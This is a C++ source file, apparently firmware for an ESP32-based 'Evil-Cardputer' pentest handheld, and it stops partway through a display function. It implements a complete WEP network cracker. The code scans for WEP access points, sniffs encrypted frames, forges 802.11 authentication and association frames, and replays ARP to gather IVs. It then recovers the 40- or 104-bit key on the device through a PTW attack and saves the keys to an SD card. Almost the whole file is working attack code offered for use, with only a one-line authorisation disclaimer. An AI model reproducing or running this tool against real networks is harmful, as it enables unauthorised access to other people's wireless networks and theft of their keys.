#pragma once
// =============================================================================
//  WEP Cracker  (Evil-Cardputer)  -  increment 2
// -----------------------------------------------------------------------------
//  Detecte les AP WEP, capture les trames chiffrees, extrait les IV, rejoue une
//  requete ARP (ARP replay facon aireplay-ng) pour generer des IV frais vite, et
//  CRACKE LA CLE EN DIRECT SUR L'APPAREIL (attaque PTW : votes Klein + key-ranking
//  borne, verification definitive par ICV CRC32). La cle (40/104 bits) s'affiche
//  a l'ecran et se sauve sur SD. Un .cap aircrack-ng reste ecrit en secours.
//  Fake-auth open-system optionnel pour les reseaux sans client associe.
//
//  Le coeur PTW/RC4 a ete valide hors ligne sur paquets synthetiques a cle connue
//  (40 bits : 100% des 40k IV ; 104 bits : ~95% a 80k IV, 100% a 160k IV), chiffres
//  conformes a aircrack-ng.
//
//  Legal : outil de pentest. N'attaquer que des reseaux dont on a l'autorisation.
// =============================================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <vector>
#include <cstdarg>

namespace wep {

struct Target { uint8_t bssid[6]; char ssid[33]; uint8_t ch; int8_t rssi; };

// ---- ring buffer rempli par le callback promiscuous (ISR-like, garder leger) --
#define WEP_CAPQ   32
#define WEP_FRMAX  256
struct Frame { uint16_t len; uint8_t data[WEP_FRMAX]; };
static Frame*            g_q     = nullptr;
static volatile uint16_t g_qHead = 0, g_qTail = 0;

static uint8_t           g_bssid[6];
static volatile uint32_t g_rxData = 0;     // trames data vers/depuis la cible
static volatile uint32_t g_rxWep  = 0;     // dont WEP (ext-IV clear)

// dedup IV : Bloom 32 Ko (262144 bits), k=4 -> reste fiable jusqu'a ~80k IV uniques
// (le 8 Ko saturait vers 40k : il croyait tout "deja vu" et stoppait compteur + votes).
#define WEP_BLOOM_BYTES 32768u
#define WEP_BLOOM_BITS  262144u
static uint8_t*          g_bloom = nullptr;
static uint32_t          g_uniqIv = 0, g_totIv = 0;
static uint32_t          g_arpVotes = 0;            // trames ARP (uniques) votees en PTW = ce qui fait casser

// ARP a rejouer
static uint8_t           g_arp[WEP_FRMAX];
static uint16_t          g_arpLen = 0;
static bool              g_haveArp = false;
static uint32_t          g_replayTx = 0;

// ---- PTW ------------------------------------------------------------------
#define WEP_KL    13          // longueur cle max (104 bits)
#define WEP_CAND  24          // candidats sigma gardes par octet (top-K pour les paires rapides)
#define WEP_NSAMP 24          // trames ARP gardees pour verif ICV
static uint16_t* g_votes  = nullptr;      // [WEP_KL][256] saturant
static uint8_t*  g_samp   = nullptr;      // [WEP_NSAMP][80] trames completes
static uint8_t   g_sampLen[WEP_NSAMP];
static uint8_t   g_nsamp  = 0;
static uint8_t   g_cand[WEP_KL][WEP_CAND];
static int       g_sbest[WEP_KL];
static uint32_t  g_sgap[WEP_KL];
static uint8_t   g_sig[WEP_KL];
static uint32_t  g_verifies = 0;
// resultat
static bool      g_cracked = false;
static uint8_t   g_key[WEP_KL];
static int       g_keyLen  = 0;
// progression deep-crack (UI dessinee plus bas -> declaration avant)
static bool        g_dcActive = false;
static const char* g_dcPhase  = "";
static int         g_dcLen    = 0;
static uint32_t    g_dcMax    = 1;
static void        dcDraw();

// plaintext ARP connu (15 octets surs : SNAP + ethertype ARP + entete ARP)
static const uint8_t ARP_KNOWN[15] = { 0xAA,0xAA,0x03,0x00,0x00,0x00,0x08,0x06,
                                       0x00,0x01,0x08,0x00,0x06,0x04,0x00 };

static inline bool macEq(const uint8_t* a, const uint8_t* b) {
  for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false; return true;
}
static inline bool isBcast(const uint8_t* a) {
  for (int i = 0; i < 6; i++) if (a[i] != 0xFF) return false; return true;
}

static bool bloomSeenAdd(uint32_t iv) {           // iv = 24 bits ; true si deja vu
  uint32_t a = iv * 2654435761u, b = (iv ^ 0x9E3779B9u) * 40503u | 1u;
  bool seen = true;
  for (int i = 0; i < 4; i++) {
    uint32_t p = (a + (uint32_t)i * b) & (WEP_BLOOM_BITS - 1), idx = p >> 3; uint8_t m = (uint8_t)(1u << (p & 7));
    if (!(g_bloom[idx] & m)) { seen = false; g_bloom[idx] |= m; }
  }
  return seen;
}
// en-tete LLC/SNAP present en clair-connu sur TOUTE trame WEP data (6 octets surs)
static const uint8_t SNAP6[6] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00 };
static uint32_t g_dataVotes = 0;                  // trames WEP (uniques) votees en court = pousse le 40 bits

// header 802.11 : 24 octets, +2 si QoS data (sous-type bit 0x80 de FC0)
static inline int hdrLen(const uint8_t* p) { return (p[0] & 0x80) ? 26 : 24; }

// ---- CRC32 (IEEE 802.3, = WEP ICV) ---------------------------------------
static uint32_t g_crcTab[256];
static bool     g_crcReady = false;
static void crcInit() {
  if (g_crcReady) return;
  for (uint32_t n = 0; n < 256; n++) { uint32_t c = n;
    for (int k = 0; k < 8; k++) c = (c & 1) ? 0xEDB88320u ^ (c >> 1) : (c >> 1);
    g_crcTab[n] = c; }
  g_crcReady = true;
}
static uint32_t crc32b(const uint8_t* d, int len) {
  uint32_t c = 0xFFFFFFFFu;
  for (int i = 0; i < len; i++) c = g_crcTab[(c ^ d[i]) & 0xFF] ^ (c >> 8);
  return c ^ 0xFFFFFFFFu;
}

// ---- RC4 ------------------------------------------------------------------
static void rc4ksa(const uint8_t* key, int klen, uint8_t S[256]) {
  for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
  int j = 0, ki = 0;                         // index cle roulant (evite le modulo logiciel/iteration)
  for (int i = 0; i < 256; i++) { j = (j + S[i] + key[ki]) & 255;
    uint8_t t = S[i]; S[i] = S[j]; S[j] = t; if (++ki == klen) ki = 0; }
}

// ---- vote PTW : iv[3], ks[] keystream (index 0..nmax+1 surs), vote positions 0..nmax-1
//   nmax=13 depuis un ARP (ks[0..14]) ; nmax=4 depuis l'en-tete SNAP de n'importe
//   quelle trame WEP (ks[0..5]) -> alimente les 4 premiers octets d'une cle 40 bits.
static void ptwAddN(const uint8_t iv[3], const uint8_t* ks, int nmax) {
  uint8_t S[256]; for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
  int j = 0; for (int i = 0; i < 3; i++) { j = (j + S[i] + iv[i]) & 255;
    uint8_t t = S[i]; S[i] = S[j]; S[j] = t; }
  uint8_t Sinv[256]; for (int i = 0; i < 256; i++) Sinv[S[i]] = (uint8_t)i;
  uint32_t cumS = 0;
  for (int n = 0; n < nmax; n++) {
    int i = n + 3;
    cumS += S[i];
    int z = ks[i - 1];                                   // Z_{i-1}
    int sigma = (Sinv[(i - z) & 255] - (int)(j + cumS)) & 255;
    uint16_t* v = &g_votes[n * 256 + sigma];
    if (*v < 0xFFFF) (*v)++;                              // saturant
  }
}

// ---- recuperation : votes -> candidats, correction par bruteforce + ICV -----
static inline void sigma2key(const uint8_t* sig, int kl, uint8_t* key) {
  int prev = 0; for (int n = 0; n < kl; n++) { key[n] = (uint8_t)((sig[n] - prev) & 255); prev = sig[n]; }
}
// echantillons : iv(4) + cipher(enc octets, FCS inclus), g_sampLen = enc.
// OPTIM VITESSE : rejet rapide par SNAP (3 octets) avant le CRC complet, et 1 seul
// echantillon (l'ICV 32 bits suffit : faux positif ~2^-32). ~2.5x plus rapide/candidat
// que l'ancienne version (2 echantillons, decrypt complet systematique).
static bool wepVerify(const uint8_t* key, int kl) {
  if (g_nsamp == 0) return false;
  const uint8_t* sm = &g_samp[0];                    // echantillon 0 = filtre
  const uint8_t* iv = sm; const uint8_t* ct = sm + 4;
  int clen = (int)g_sampLen[0] - 4;                  // retire le FCS
  if (clen < 8 || clen > 76) return false;
  uint8_t rk[16]; rk[0] = iv[0]; rk[1] = iv[1]; rk[2] = iv[2]; memcpy(rk + 3, key, kl);
  uint8_t S[256]; rc4ksa(rk, 3 + kl, S);
  int a = 0, b = 0; uint8_t pt[80];
  for (int n = 0; n < 3; n++) { a = (a + 1) & 255; b = (b + S[a]) & 255;   // 3 octets -> SNAP
    uint8_t t = S[a]; S[a] = S[b]; S[b] = t; pt[n] = ct[n] ^ S[(S[a] + S[b]) & 255]; }
  if (pt[0] != 0xAA || pt[1] != 0xAA || pt[2] != 0x03) return false;       // REJET RAPIDE (2^-24)
  for (int n = 3; n < clen; n++) { a = (a + 1) & 255; b = (b + S[a]) & 255; // reste -> ICV
    uint8_t t = S[a]; S[a] = S[b]; S[b] = t; pt[n] = ct[n] ^ S[(S[a] + S[b]) & 255]; }
  uint32_t crc = crc32b(pt, clen - 4);
  uint32_t icv = pt[clen - 4] | pt[clen - 3] << 8 | pt[clen - 2] << 16 | ((uint32_t)pt[clen - 1] << 24);
  return crc == icv;
}
static void buildCands(int kl) {
  for (int n = 0; n < kl; n++) {
    uint8_t taken[256]; memset(taken, 0, 256);
    for (int c = 0; c < WEP_CAND; c++) {
      int best = -1; uint32_t bv = 0;
      for (int s = 0; s < 256; s++) if (!taken[s] && g_votes[n * 256 + s] >= bv) { bv = g_votes[n * 256 + s]; best = s; }
      if (best < 0) best = 0; taken[best] = 1; g_cand[n][c] = (uint8_t)best;
    }
  }
}
// brute complet (0..255) des positions listees, les autres fixees a g_sbest
static bool bruteFull(int idx, int m, const int* list, int kl, uint32_t maxVer, uint8_t out[WEP_KL]) {
  if (idx == m) {
    uint8_t key[WEP_KL]; sigma2key(g_sig, kl, key); g_verifies++;
    if ((g_verifies & 0x1FFF) == 0) {             // rend la main (watchdog) toutes les ~8k verifs
      delay(1);
      if (g_dcActive && (g_verifies & 0x7FFF) == 0) dcDraw();
    }
    if (wepVerify(key, kl)) { memcpy(out, key, kl); return true; }
    return false;
  }
  for (int v = 0; v < 256; v++) {
    g_sig[list[idx]] = (uint8_t)v;
    if (bruteFull(idx + 1, m, list, kl, maxVer, out)) return true;
    if (g_verifies >= maxVer) return false;
  }
  return false;
}
// deep=false : best + balayage 1 octet (rapide). deep=true : + paires (lent).
static bool ptwCrackLen(int kl, bool deep, uint8_t out[WEP_KL]) {
  if (g_nsamp == 0) return false;
  buildCands(kl);
  for (int n = 0; n < kl; n++) {
    uint32_t v0 = g_votes[n * 256 + g_cand[n][0]], v1 = g_votes[n * 256 + g_cand[n][1]];
    g_sbest[n] = g_cand[n][0]; g_sgap[n] = v0 - v1;
  }
  int order[WEP_KL]; for (int n = 0; n < kl; n++) order[n] = n;
  for (int a = 0; a < kl; a++) for (int b = a + 1; b < kl; b++)
    if (g_sgap[order[b]] < g_sgap[order[a]]) { int t = order[a]; order[a] = order[b]; order[b] = t; }
  g_verifies = 0; const uint32_t MAXV = deep ? 7000000u : 20000u;  // verif 2.5x + rapide -> budget relevable
  g_dcLen = kl; g_dcMax = MAXV;
  int one[1];
  g_dcPhase = "best guess";
  for (int n = 0; n < kl; n++) g_sig[n] = g_sbest[n];
  if (bruteFull(0, 0, one, kl, MAXV, out)) return true;           // 1) best-only
  g_dcPhase = "single-byte sweep";
  for (int n = 0; n < kl; n++) { for (int k = 0; k < kl; k++) g_sig[k] = g_sbest[k]; one[0] = n;
    if (bruteFull(0, 1, one, kl, MAXV, out)) return true; }        // 2) each byte alone
  if (!deep) return false;
  // 3) paires sur les TOP-K candidats de chaque octet (rapide : couvre 2 octets faux dans le top-24)
  g_dcPhase = "pairs (top cand)";
  for (int i = 0; i < kl; i++) for (int j = i + 1; j < kl; j++) {
    for (int k = 0; k < kl; k++) g_sig[k] = g_sbest[k];
    for (int ci = 0; ci < WEP_CAND; ci++) { g_sig[i] = g_cand[i][ci];
      for (int cj = 0; cj < WEP_CAND; cj++) { g_sig[j] = g_cand[j][cj];
        uint8_t key[WEP_KL]; sigma2key(g_sig, kl, key); g_verifies++;
        if ((g_verifies & 0x1FFF) == 0) { delay(1); if (g_dcActive && (g_verifies & 0x7FFF) == 0) dcDraw(); }
        if (wepVerify(key, kl)) { memcpy(out, key, kl); return true; }
      }
    }
    if (g_verifies >= MAXV) return false;
  }
  // 4) repli : paires PLEINES (0..255) sur les positions les moins sures (cas durs)
  g_dcPhase = "pairs (full, weak)";
  int T = kl < 7 ? kl : 7; int pair[2];
  for (int i = 0; i < T; i++) for (int j = i + 1; j < T; j++) {
    for (int k = 0; k < kl; k++) g_sig[k] = g_sbest[k];
    pair[0] = order[i]; pair[1] = order[j];
    if (bruteFull(0, 2, pair, kl, MAXV, out)) return true;
    if (g_verifies >= MAXV) return false;
  }
  return false;
}
// essaie 104 puis 40 bits ; renseigne g_key/g_keyLen/g_cracked
static bool ptwCrack(bool deep) {
  uint8_t out[WEP_KL];
  g_dcActive = deep;
  bool ok = false;
  // 40 bits d'abord (plus courant, alimente par tout le trafic, et rapide a exclure)
  if (ptwCrackLen(5, deep, out)) { memcpy(g_key, out, 5); g_keyLen = 5; g_cracked = true; ok = true; }
  else if (ptwCrackLen(13, deep, out)) { memcpy(g_key, out, 13); g_keyLen = 13; g_cracked = true; ok = true; }
  g_dcActive = false;
  return ok;
}

static void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pk = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pk->payload; int len = pk->rx_ctrl.sig_len;
  if (len < 28) return;
  if ((p[0] & 0x0C) != 0x08) return;              // pas une trame data
  if (!(p[1] & 0x40)) return;                     // Protected bit absent
  uint8_t tods = p[1] & 0x01, fromds = (p[1] & 0x02) >> 1;
  const uint8_t* a1 = p + 4; const uint8_t* a2 = p + 10; const uint8_t* a3 = p + 16;
  const uint8_t* bss;
  if (!tods && !fromds) bss = a3;
  else if (tods && !fromds) bss = a1;
  else if (!tods && fromds) bss = a2;
  else return;                                    // WDS : ignore
  if (!macEq(bss, (uint8_t*)g_bssid)) return;
  int hl = hdrLen(p);
  if (len < hl + 4) return;
  if (p[hl + 3] & 0x20) return;                   // Extended IV set => TKIP/CCMP, pas WEP
  uint16_t nx = (uint16_t)((g_qHead + 1) % WEP_CAPQ);
  if (nx == g_qTail) return;
  int cp = len > WEP_FRMAX ? WEP_FRMAX : len;
  memcpy(g_q[g_qHead].data, p, cp); g_q[g_qHead].len = (uint16_t)cp;
  g_qHead = nx;
}

// ---- pcap link-type 105 (IEEE802.11), compatible aircrack-ng --------------
static File  g_cap;
static void capOpen(const Target& t) {
  SD.mkdir("/evil"); SD.mkdir("/evil/wep");
  String fn; int n = 0;
  do { fn = "/evil/wep/wep-" + String(n++) + ".cap"; } while (SD.exists(fn));
  g_cap = SD.open(fn, FILE_WRITE);
  if (!g_cap) return;
  const uint8_t gh[24] = { 0xd4,0xc3,0xb2,0xa1, 0x02,0x00,0x04,0x00,
                           0,0,0,0, 0,0,0,0, 0xff,0xff,0,0, 0x69,0,0,0 };
  g_cap.write(gh, 24); g_cap.flush();
  Serial.printf("[WEP] cap -> %s\n", fn.c_str());
}
static void capFrame(const uint8_t* d, uint16_t len) {
  if (!g_cap) return;
  uint32_t ts = millis(), sec = ts / 1000, usec = (ts % 1000) * 1000, L = len;
  g_cap.write((uint8_t*)&sec, 4); g_cap.write((uint8_t*)&usec, 4);
  g_cap.write((uint8_t*)&L, 4);   g_cap.write((uint8_t*)&L, 4);
  g_cap.write(d, len);
}
static void saveKey(const Target& t) {
  SD.mkdir("/evil"); SD.mkdir("/evil/wep");
  File f = SD.open("/evil/wep/wep-keys.txt", FILE_APPEND);
  if (!f) return;
  f.printf("%s %02X:%02X:%02X:%02X:%02X:%02X ch%d  KEY ",
           t.ssid[0] ? t.ssid : "(hidden)",
           t.bssid[0], t.bssid[1], t.bssid[2], t.bssid[3], t.bssid[4], t.bssid[5], t.ch);
  for (int i = 0; i < g_keyLen; i++) f.printf("%02X%s", g_key[i], i + 1 < g_keyLen ? ":" : "");
  f.print("  ascii ");
  for (int i = 0; i < g_keyLen; i++) f.printf("%c", (g_key[i] >= 32 && g_key[i] < 127) ? g_key[i] : '.');
  f.printf("  (%d bits, %lu IV)\n", g_keyLen == 13 ? 104 : 40, (unsigned long)g_uniqIv);
  f.close();
}

// ---------------------------------------------------------------------------
//  UI helpers
// ---------------------------------------------------------------------------
// ---- palette & helpers M5GFX ----------------------------------------------
#define WC_BG    menuBackgroundColor
#define WC_ACC   0x07FF      // cyan
#define WC_OK    0x07E0      // vert
#define WC_WARN  0xFFE0      // jaune
#define WC_BAD   0xF922      // rouge
#define WC_GREY  0x8C71      // gris
#define WC_WHITE 0xFFFF
#define WC_HEAD  0x033F      // bleu barre de titre
static uint8_t g_spin = 0;
static inline char spinChar() { static const char sp[] = "|/-\\"; return sp[(g_spin) & 3]; }

static int wcW() { return M5.Display.width(); }
static void uiHeader(const char* title, const char* right = nullptr) {
  auto& d = M5.Display; int W = wcW();
  d.fillRect(0, 0, W, 18, WC_HEAD);
  d.setTextSize(1.5); d.setTextColor(WC_WHITE, WC_HEAD);
  d.setCursor(5, 3); d.print(title);
  if (right) { int tw = d.textWidth(right); d.setCursor(W - tw - 5, 3); d.print(right); }
}
static void uiFooter(const char* txt) {
  auto& d = M5.Display; int W = wcW(), H = d.height();
  d.fillRect(0, H - 15, W, 15, WC_HEAD);
  d.setTextSize(1); d.setTextColor(WC_WHITE, WC_HEAD);
  d.setCursor(5, H - 12); d.print(txt);
}
// jauge horizontale avec cadre + remplissage colore + libelle a droite
static void uiBar(int x, int y, int w, int h, float frac, uint16_t col) {
  auto& d = M5.Display; if (frac < 0) frac = 0; if (frac > 1) frac = 1;
  d.drawRoundRect(x, y, w, h, 2, WC_GREY);
  int fw = (int)((w - 4) * frac);
  if (fw > 0) d.fillRoundRect(x + 2, y + 2, fw, h - 4, 1, col);
}
static void uiLabel(int x, int y, uint16_t col, const char* fmt, ...) {
  char b[64]; va_list ap; va_start(ap, fmt); vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
  auto& d = M5.Display; d.setTextSize(1.5); d.setTextColor(col, WC_BG); d.setCursor(x, y); d.print(b);
}
static void uiChip(int x, int y, const char* txt, uint16_t col) {   // petite pastille d'etat
  auto& d = M5.Display; d.setTextSize(1); int tw = d.textWidth(txt);
  d.drawRoundRect(x, y, tw + 8, 12, 3, col); d.setTextColor(col, WC_BG);
  d.setCursor(x + 4, y + 2); d.print(txt);
}

static void banner(const char* l1, const char* l2 = nullptr) {
  auto& d = M5.Display; d.clear(WC_BG);
  uiHeader("WEP CRACKER");
  d.setTextSize(1.5); d.setTextColor(WC_ACC, WC_BG);
  d.setCursor(8, 44); d.print(l1);
  if (l2) { d.setTextColor(WC_WHITE, WC_BG); d.setCursor(8, 70); d.print(l2); }
}
// ecran d'etape anime (spinner) : titre + ligne d'etat
static void stageScreen(const char* step, const char* detail, uint16_t col = WC_ACC) {
  auto& d = M5.Display; d.clear(WC_BG);
  uiHeader("WEP CRACKER");
  char s[48]; snprintf(s, sizeof s, "%c %s", spinChar(), step);
  d.setTextSize(2); d.setTextColor(col, WC_BG); d.setCursor(8, 46); d.print(s);
  if (detail) { d.setTextSize(1.5); d.setTextColor(WC_GREY, WC_BG); d.setCursor(8, 78); d.print(detail); }
  g_spin++;
}
// progression du deep-crack (appelee depuis bruteFull)
static void dcDraw() {
  auto& d = M5.Display; d.clear(WC_BG);
  uiHeader("DEEP CRACK", g_dcLen == 13 ? "104 bits" : "40 bits");
  uiLabel(8, 26, WC_ACC, "%c %s", spinChar(), g_dcPhase);
  uiLabel(8, 50, WC_WHITE, "verifs: %lu", (unsigned long)g_verifies);
  float fr = (float)g_verifies / (float)(g_dcMax ? g_dcMax : 1);
  uiBar(8, 74, wcW() - 16, 16, fr, WC_WARN);
  uiFooter("PTW crack running - please wait");
  g_spin++;
}

static void teardownRadio() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
}

// ---------------------------------------------------------------------------
//  Fake-auth open-system (pour reseaux sans client associe)  -- best effort
// ---------------------------------------------------------------------------
static volatile bool g_gotAuth = false, g_gotAssoc = false;
static uint8_t       g_mymac[6];
static void authCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pk = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pk->payload; int len = pk->rx_ctrl.sig_len;
  if (len < 28) return;
  uint8_t subtype = (p[0] & 0xF0);
  const uint8_t* dst = p + 4; const uint8_t* src = p + 10;
  if (!macEq(src, (uint8_t*)g_bssid)) return;
  if (!macEq(dst, (uint8_t*)g_mymac)) return;
  if (subtype == 0xB0) {                          // Authentication
    // body @24 : algo(2) seq(2) status(2) ; open=algo0 seq2 status0
    if (len >= 30 && p[24] == 0 && p[25] == 0 && p[26] == 2 && p[28] == 0 && p[29] == 0) g_gotAuth = true;
  } else if (subtype == 0x10) {                   // Association Response
    if (len >= 28 && p[26] == 0 && p[27] == 0) g_gotAssoc = true;   // status 0
  }
}
static bool fakeAuth(const Target& t) {
  esp_wifi_get_mac(WIFI_IF_STA, g_mymac);
  esp_wifi_set_promiscuous_rx_cb(&authCb);
  wifi_promiscuous_filter_t fm; fm.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&fm);

  // --- Authentication (open, seq 1) ---
  uint8_t au[30]; memset(au, 0, sizeof au);
  au[0] = 0xB0; au[1] = 0x00; au[2] = 0x3A; au[3] = 0x01;
  memcpy(au + 4,  t.bssid, 6); memcpy(au + 10, g_mymac, 6); memcpy(au + 16, t.bssid, 6);
  au[24] = 0; au[25] = 0; au[26] = 1; au[27] = 0; au[28] = 0; au[29] = 0;   // algo0 seq1 status0

  g_gotAuth = false;
  for (int tries = 0; tries < 8 && !g_gotAuth; tries++) {
    char d[32]; snprintf(d, sizeof d, "auth seq1  try %d/8", tries + 1);
    stageScreen("Fake-auth", d);
    esp_wifi_80211_tx(WIFI_IF_STA, au, 30, false);
    uint32_t t0 = millis(); while (millis() - t0 < 200 && !g_gotAuth) { delay(5); }
  }
  if (!g_gotAuth) { stageScreen("Fake-auth", "no response (continuing)", WC_WARN); delay(500); return false; }
  stageScreen("Fake-auth", "auth OK -> association", WC_OK); delay(250);

  // --- Association request ---
  uint8_t as[80]; int o = 0;
  as[o++] = 0x00; as[o++] = 0x00; as[o++] = 0x3A; as[o++] = 0x01;
  memcpy(as + o, t.bssid, 6); o += 6; memcpy(as + o, g_mymac, 6); o += 6; memcpy(as + o, t.bssid, 6); o += 6;
  as[o++] = 0x00; as[o++] = 0x00;                 // seq ctl
  as[o++] = 0x01; as[o++] = 0x00;                 // capability : ESS
  as[o++] = 0x0A; as[o++] = 0x00;                 // listen interval
  int sl = strlen(t.ssid);                        // SSID element
  as[o++] = 0x00; as[o++] = (uint8_t)sl; memcpy(as + o, t.ssid, sl); o += sl;
  const uint8_t rates[] = { 0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24 };  // supported rates
  as[o++] = 0x01; as[o++] = 8; memcpy(as + o, rates, 8); o += 8;

  g_gotAssoc = false;
  for (int tries = 0; tries < 8 && !g_gotAssoc; tries++) {
    char d[32]; snprintf(d, sizeof d, "assoc req  try %d/8", tries + 1);
    stageScreen("Fake-auth", d);
    esp_wifi_80211_tx(WIFI_IF_STA, as, o, false);
    uint32_t t0 = millis(); while (millis() - t0 < 200 && !g_gotAssoc) { delay(5); }
  }
  stageScreen("Fake-auth", g_gotAssoc ? "associated!" : "assoc failed (continuing)",
              g_gotAssoc ? WC_OK : WC_WARN); delay(400);
  return g_gotAssoc;
}

// ---------------------------------------------------------------------------
//  Scan : liste des AP WEP
// ---------------------------------------------------------------------------
static int scanWep(std::vector<Target>& out) {
  out.clear();
  stageScreen("WiFi scan", "searching WEP networks...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n && out.size() < 32; i++) {
    if (WiFi.encryptionType(i) != WIFI_AUTH_WEP) continue;
    Target t; memset(&t, 0, sizeof t);
    const uint8_t* b = WiFi.BSSID(i); if (b) memcpy(t.bssid, b, 6);
    strncpy(t.ssid, WiFi.SSID(i).c_str(), 32);
    t.ch = (uint8_t)WiFi.channel(i); t.rssi = (int8_t)WiFi.RSSI(i);
    out.push_back(t);
  }
  WiFi.scanDelete();
  return (int)out.size();
}

// barres de signal 0..4 depuis le RSSI
static int rssiBars(int8_t r) { if (r >= -45) return 4; if (r >= -60) return 3; if (r >= -72) return 2; if (r >= -85) return 1; return 0; }
static void drawBars(int x, int y, int bars) {
  auto& d = M5.Display;
  for (int i = 0; i < 4; i++) {
    int bh = 3 + i * 3; uint16_t c = (i < bars) ? WC_OK : WC_GREY;
    d.fillRect(x + i * 5, y + 12 - bh, 4, bh, c);
  }
}
static int pickTarget(std::vector<Target>& t) {
  if (t.empty()) {
    auto& d = M5.Display; d.clear(WC_BG); uiHeader("WEP CRACKER");
    d.setTextSize(2); d.setTextColor(WC_BAD, WC_BG); d.setCursor(8, 44); d.print("No WEP AP");
    d.setTextSize(1.5); d.setTextColor(WC_GREY, WC_BG); d.setCursor(8, 76); d.print("no WEP network in range");
    uiFooter("DEL: back");
    while (!kp(KEY_BACKSPACE) && !kp('`')) { M5.update(); cardUpdate(); delay(20); } keyRelease(); return -1;
  }
  int sel = 0, top = 0;
  auto draw = [&]() {
    auto& d = M5.Display; d.clear(WC_BG);
    char hr[16]; snprintf(hr, sizeof hr, "%d WEP", (int)t.size());
    uiHeader("WEP TARGETS", hr);
    const int rows = 5, rh = 19, y0 = 22;
    if (sel < top) top = sel; if (sel >= top + rows) top = sel - rows + 1;
    for (int r = 0; r < rows; r++) {
      int i = top + r; if (i >= (int)t.size()) break;
      int y = y0 + r * rh; bool on = (i == sel);
      if (on) d.fillRoundRect(2, y - 2, wcW() - 4, rh - 1, 3, WC_HEAD);
      d.setTextSize(1.5); d.setTextColor(on ? WC_WHITE : WC_GREY, on ? WC_HEAD : WC_BG);
      d.setCursor(6, y + 1); d.printf("%-13.13s", t[i].ssid[0] ? t[i].ssid : "(hidden)");
      d.setTextColor(on ? WC_ACC : WC_GREY, on ? WC_HEAD : WC_BG);
      d.setCursor(150, y + 1); d.printf("c%-2d", t[i].ch);
      drawBars(wcW() - 26, y, rssiBars(t[i].rssi));
    }
    uiFooter("; / . select   ENTER run   DEL quit");
  };
  draw();
  while (true) {
    M5.update(); cardUpdate();
    if (kp(';')) { keyRelease(); if (sel > 0) sel--; draw(); }
    if (kp('.')) { keyRelease(); if (sel + 1 < (int)t.size()) sel++; draw(); }
    if (kp(KEY_ENTER)) { enterDebounce(); return sel; }
    if (kp(KEY_BACKSPACE) || kp('`')) { keyRelease(); return -1; }
    delay(12);
  }
}

// ---------------------------------------------------------------------------
//  Boucle de capture + crack en direct
// ---------------------------------------------------------------------------
static void captureLoop(const Target& t) {
  memcpy((void*)g_bssid, t.bssid, 6);
  g_rxData = g_rxWep = g_uniqIv = g_totIv = g_replayTx = 0;
  g_arpVotes = g_dataVotes = 0;
  g_qHead = g_qTail = 0; g_haveArp = false; g_arpLen = 0;
  memset(g_votes, 0, (size_t)WEP_KL * 256 * sizeof(uint16_t));
  g_nsamp = 0; g_cracked = false; g_keyLen = 0;

  WiFi.disconnect(true, false); WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(t.ch, WIFI_SECOND_CHAN_NONE);

  bool assoc = fakeAuth(t);                         // best effort ; dessine ses propres etapes

  // bascule en capture data
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  wifi_promiscuous_filter_t f; f.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  capOpen(t);

  bool replay = false;
  uint32_t t0 = millis(), lastTx = 0, lastDraw = 0, lastFlush = 0, nextCrackIv = 15000;
  const uint32_t IV_GOAL = 40000;                   // jalon ~crackable 40 bits

  // --- rendu sans scintillement : fond statique dessine 1x, champs live mis a jour en place ---
  int lastView = -1;                                // -1 force un redraw complet
  auto drawStaticCap = [&]() {
    auto& d = M5.Display; d.clear(WC_BG);
    uiHeader("WEP CRACK", t.ssid[0] ? t.ssid : "(hidden)");
    uiLabel(6, 22, WC_GREY, "%02X:%02X:%02X:%02X:%02X:%02X ch%d",
            t.bssid[0], t.bssid[1], t.bssid[2], t.bssid[3], t.bssid[4], t.bssid[5], t.ch);
    d.drawRoundRect(6, 56, wcW() - 12, 12, 2, WC_GREY);         // cadre jauge (statique)
    uiFooter("ENTER replay  C crack  R reset  DEL quit");
  };
  auto drawStaticCracked = [&]() {
    auto& d = M5.Display; d.clear(WC_BG); int W = wcW();
    d.fillRect(0, 0, W, 18, WC_OK);
    d.setTextSize(1.5); d.setTextColor(0x0000, WC_OK); d.setCursor(5, 3);
    d.printf("KEY FOUND  %d bits", g_keyLen == 13 ? 104 : 40);
    d.drawRoundRect(4, 24, W - 8, 60, 4, WC_OK);
    d.setTextSize(1); d.setTextColor(WC_GREY, WC_BG); d.setCursor(10, 30); d.print("HEX");
    d.setTextSize(1.5); d.setTextColor(WC_WHITE, WC_BG); d.setCursor(10, 40);
    for (int i = 0; i < g_keyLen; i++) d.printf("%02X%s", g_key[i], i + 1 < g_keyLen ? ":" : "");
    d.setTextSize(1); d.setTextColor(WC_GREY, WC_BG); d.setCursor(10, 60); d.print("ASCII");
    d.setTextSize(1.5); d.setTextColor(WC_ACC, WC_BG); d.setCursor(10, 70);
    for (int i = 0; i < g_keyLen; i++) d.printf("%c", (g_key[i] >= 32 && g_key[i] < 127) ? g_key[i] : '.');
    uiLabel(8, 92, WC_GREY, "%s  %lu IV", t.ssid[0] ? t.ssid : "(hidden)", (unsigned long)g_uniqIv);
    uiLabel(8, 104, WC_OK, "saved: /evil/wep/wep-keys.txt");
